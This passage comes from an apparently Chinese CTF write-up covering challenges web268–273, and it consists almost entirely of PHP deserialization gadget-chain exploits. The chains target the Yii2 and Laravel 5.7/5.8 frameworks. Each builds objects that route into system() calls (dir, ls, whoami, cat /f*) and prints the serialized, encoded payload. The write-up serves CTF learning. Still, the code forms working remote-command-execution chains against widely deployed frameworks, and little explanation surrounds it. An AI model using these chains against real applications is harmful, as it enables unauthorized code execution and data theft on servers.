class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210417232717446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h2 id="web268-web270"><a href="#web268-web270" class="headerlink" title="web268~web270"></a>web268~web270</h2><p>这里整理一下poc链！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POC2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc2</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    // 生成<span class="title">poc</span></span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POC3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;dir&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POC4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;system&#x27;, &#x27;whoami&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来张图！<br><img src="https://img-blog.csdnimg.cn/20210417235257535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><h1 id="web271-273-Laravel5-7-5-8-反序列化漏洞"><a href="#web271-273-Laravel5-7-5-8-反序列化漏洞" class="headerlink" title="web271-273(Laravel5.7,5.8 反序列化漏洞)"></a>web271-273(Laravel5.7,5.8 反序列化漏洞)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=<span class="keyword">new</span> Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event=<span class="keyword">new</span> QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Mockery</span>\<span class="title">Generator</span>\<span class="title">MockDefinition</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection=<span class="keyword">new</span> MockDefinition();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Mockery</span>\<span class="title">Loader</span>\<span class="title">EvalLoader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> EvalLoader(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code=<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);?&gt;&quot;</span>; <span class="comment">//此处是PHP代码</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;config=<span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&quot;feng&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingBroadcast()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021041809585753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span 